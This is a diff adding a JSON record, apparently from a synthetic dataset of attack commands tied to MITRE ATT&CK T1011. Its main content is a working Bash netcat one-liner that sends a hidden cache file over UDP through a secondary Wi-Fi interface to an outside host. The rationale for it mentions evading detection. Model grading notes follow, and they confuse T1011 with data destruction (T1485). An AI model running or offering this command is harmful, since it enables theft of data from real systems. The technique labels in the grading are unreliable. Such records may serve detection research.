@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
+  "explanation": "Exfiltrates data via a secondary Wi\u2011Fi interface using UDP to an uncommon port, aligning with T1011 by using a network medium (wlan1) distinct from the primary channel. iwconfig is used for monitoring the interface before transmission.",
+  "rationale_steps": [
+    "Verify availability of the alternate Wi\u2011Fi interface with iwconfig (monitoring only).",
+    "Bind netcat to the wlan1 source IP to force traffic over the distinct Wi\u2011Fi medium.",
+    "Send the file over UDP to an uncommon port to reduce detection without changing system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-4aaad84e",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), redirection (>/dev/null 2>&1, <), command substitution ($()), and appropriate use of quotes and flags for all utilities involved.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over UDP as claimed, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1485 (Data Destruction) which is the technique being evaluated, as it's sending data rather than destroying it.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:36:30.250268Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for command execution, redirection, command substitution, and netcat parameters.",
+        "semantic_score": 0,
+        "semantic_justification": "The command performs data exfiltration, as explicitly stated in the explanation, which is fundamentally opposed to data destruction (T1011); it does not delete, wipe, or corrupt any local data.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:36:38.983060Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, correct command substitution, and valid redirections and nc options.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates the file over UDP bound to wlan1's IPv4 address as intended, but it does not perform data destruction and could fail if wlan1 lacks an address or the nc variant differs.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T02:37:16.573356Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
